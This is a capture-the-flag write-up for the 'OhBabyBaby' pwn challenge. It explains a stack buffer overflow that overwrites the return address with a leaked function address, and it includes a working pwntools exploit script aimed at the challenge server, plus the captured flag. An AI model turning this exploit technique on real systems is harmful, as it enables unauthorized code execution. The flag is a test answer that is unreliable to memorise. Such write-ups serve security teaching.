## OhBabyBaby 

### Challenge Description

If you don't solve this, Dennis Ritchie will be really heartbroken :(  

nc 185.14.184.242 12990  

### Writeup
We are given a server address and its code. If you see the code, you will understand that one of the functions is reading the flag and we have to give input in a way that oass some bytes and reach `rip`. If you analyze the elf file in gdb you will see that after putting 72 extra bytes you can reach rip. The address of this function is shown when running this program. We read this address and put this address after 72 extra bytes.  
We used code below and could get the flag.  
```python
from pwn import *
bof = b"A"*72
conn = remote('185.14.184.242', '12990')
#conn = process('./ohbabybaby')
data = conn.recvuntil(".....................................Tap Tap to see your prize!!....................................\n").decode("utf-8")
print(data)
conn.sendline("A")   # so that we can see the address of ultimatePrize
data = conn.recvuntil("............................................Did you enjoy?..........................................").decode("utf-8")
conn.recvuntil("\n")
print(data)
address = "0x"+data.split("0x")[1][:12]
print(address)
conn.recvline()
try:
    conn.sendline(bof + p64(int(address, 16)))
    print(conn.recvall().decode("utf-8"))
except:
    print("error!\n")
    print(conn.recvall().decode("utf-8"))
```
Here is the flag:  
```
S4CTF{W311_D0n3_f0r_th3_3xpl0it_Vuln3rability_i5_aws0m3!!}
```
